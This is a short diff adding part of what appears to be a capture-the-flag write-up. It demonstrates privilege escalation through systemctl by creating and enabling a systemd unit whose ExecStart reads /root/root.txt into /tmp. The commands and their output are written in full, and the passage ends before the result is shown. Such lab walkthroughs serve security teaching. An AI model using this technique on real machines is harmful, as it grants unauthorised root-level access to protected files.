@@ -1,0 +1,16 @@
+First we create a variable which holds a unique file.
+
+$ eop=$(mktemp).service
+Then we create an unit file and write it into the variable.
+
+$ echo '[Service]
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+> [Install]
+> WantedBy=multi-user.target' > $eop
+Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.
+
+$ /bin/systemctl link $eop
+Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+$ /bin/systemctl enable --now $eop
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.
+Let’s see if it worked….
